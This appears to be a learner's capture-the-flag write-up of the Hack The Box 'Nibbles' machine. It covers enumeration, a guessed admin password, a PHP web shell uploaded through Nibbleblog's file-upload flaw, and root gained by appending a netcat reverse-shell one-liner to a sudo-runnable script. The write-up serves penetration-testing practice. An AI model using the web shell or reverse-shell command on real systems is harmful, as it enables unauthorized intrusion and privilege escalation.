## Target 10.129.221.202
+ Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)
	+ nmap -sV --script=http-enum
	+ Apache 2.4.18
+ Gain a foothold on the target and submit the user.txt flag


![image](https://github.com/user-attachments/assets/6fc2b17e-a7d3-483c-a29f-7c77e168601b)

Located in the source file, we can see that there is a directory named nibble blog.
To further enumerate I am going to use GoBuster.
So far we have some decent sub directories
```
/.hta                 (Status: 403) [Size: 303]
/.htaccess            (Status: 403) [Size: 308]
/.htpasswd            (Status: 403) [Size: 308]
/admin                (Status: 301) [Size: 325] [--> http://10.129.253.92/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 327] [--> http://10.129.253.92/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 329] [--> http://10.129.253.92/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 327] [--> http://10.129.253.92/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 326] [--> http://10.129.253.92/nibbleblog/themes/]

```
- Since this has an admin.php page there will be a README file.
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

```
This version of nibbleblog is vulnerable to Arbitrary File upload
In the contents/private/ directory we find a users.xml, which confirms the admin login is admin
```
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
```
After bashing my head for a while, the next step came in the form of guessing Admin credentials as the password was the name of the blog "nibbles"

This version of Nibbleblog 4.0.3 is vulnerable to Arbitrary File Upload CVE-2015-6967
![image](https://github.com/user-attachments/assets/da3862b2-0f6b-486b-a7f4-7839b3e2eb27)

We can use this my image tab to upload a malicious file.
![image](https://github.com/user-attachments/assets/4c80c009-437f-4d06-b284-76a4f55da29e)


![image](https://github.com/user-attachments/assets/64b1797b-a36a-4fa7-80d3-ab8d6cb7e0d3)

- It seems our file may have been uploaded
  
![image](https://github.com/user-attachments/assets/2c62875b-37c4-4f09-960b-c4ee67566eae)

- So lets navigate back to content to find out
![image](https://github.com/user-attachments/assets/32aa82b7-ed11-4593-b793-4be5b6bd17b9)

- Which we see our file is now in the my_image directory
```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.129.253.92/nibbleblog/content/private/plugins/my_image/image.php
</php system($_REQUEST["cmd"]); ?>

```
We know it executes the file. Now we just need to find a file to give it.
We can find a bash one liner in PHP

![image](https://github.com/user-attachments/assets/4a3138d1-560f-4246-b5a5-43b5e3318130)

Setup a listener
```
nc -lvnp 9443
```

python not found but python3 is 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

In the users zip file it has a writable script file monitor.sh
```
gmdoggo@htb[/htb]$ sudo python3 -m http.server 8080
[sudo] password for ben: ***********

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -

```
While we take a look at that we can make up a http server for transferring a enum script over

Once the file is transferred we can send it over and run it (After allowing it execute privs.)

```
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

We can pwn this monitor.sh file by adding the same one-liner reverse shell to connect back with root

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.189 8443 >/tmp/f' | tee -a monitor.sh
```

- If we cat the monitor.sh file, we will see the contents appended to the end. It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.
- We can than utilize the privledge over the file to run it
